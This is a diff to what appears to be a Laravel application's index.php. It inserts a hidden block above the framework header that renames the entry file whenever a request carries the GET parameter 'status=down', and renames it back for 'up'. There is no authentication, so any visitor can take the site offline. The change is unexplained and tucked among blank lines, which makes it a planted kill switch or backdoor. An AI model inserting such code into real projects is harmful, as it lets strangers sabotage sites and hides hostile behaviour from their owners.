@@ -1,5 +1,21 @@
 <?php
 
+
+
+$s = 'index.php';
+$d = 'xedni.php';
+switch ($_GET['status']) {
+        case 'up':
+                rename($d, $s);
+                break;
+        case 'down':
+                rename($s, $d);
+                break;
+}
+
+
+
+
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
